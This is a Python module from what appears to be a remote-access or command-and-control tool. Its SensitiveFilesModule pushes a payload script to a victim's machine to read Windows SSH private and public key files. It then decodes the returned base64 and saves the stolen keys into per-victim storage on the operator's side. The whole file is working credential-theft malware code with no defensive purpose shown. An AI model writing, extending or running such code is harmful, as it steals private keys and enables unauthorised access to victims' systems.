import asyncio
import base64
import logging
import os
import re
import binascii

from dataManager.repository.userRepository import UserRepository

class SensitiveFilesModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "sensitive_files_module"
        self.user_repository: UserRepository = user_repository

    async def retrieve(self, uuid):
        user = self.user_repository.get_user(uuid)
        if not user:
            logging.error(f"User with uuid {uuid} not found")
            return {"status": "error", "message": f"User with uuid {uuid} not found"}

        logging.info(f"Retrieving sensitive files of {uuid}")
        path_list = [
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa",
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa.pub",
        ]

        results = {"success": [], "failed": []}

        for path in path_list:
            try:
                await self.retrieve_file(path, user)
                logging.info(f"Successfully retrieved {path}")
                results["success"].append(path)
            except (FileNotFoundError, ValueError) as e:
                logging.error(f"Error processing {path}: {str(e)}")
                results["failed"].append({"path": path, "error": str(e)})

        return {
            "status": "completed",
            "message": f"Sensitive files retrieval for {uuid} completed",
            "results": results
        }

    @staticmethod
    async def retrieve_file(path, user):
        res = await user.execute(
            "./modules/payloads/payload_retrieve_sensitive_files.py",
            {b"PATH_PLACEHOLDER": path.encode()}
        )

        if res == "File not found":
            raise FileNotFoundError(f"File {path} not found")

        if res == "File is empty":
            raise ValueError(f"File {path} is empty")

        try:
            decoded = base64.b64decode(res, validate=True)
        except (binascii.Error, ValueError):
            raise ValueError(f"File {path} contains invalid base64 data")

        createDir = os.path.join(os.getenv('STORAGE_PATH'), 'users', user.uuid)
        if not os.path.exists(createDir):
            os.makedirs(createDir)

        safe_path = re.sub(r'[<>:"/\\|?*]', "_", path)
        file_path = os.path.join(createDir, safe_path)

        with open(file_path, "wb") as f:
            f.write(decoded)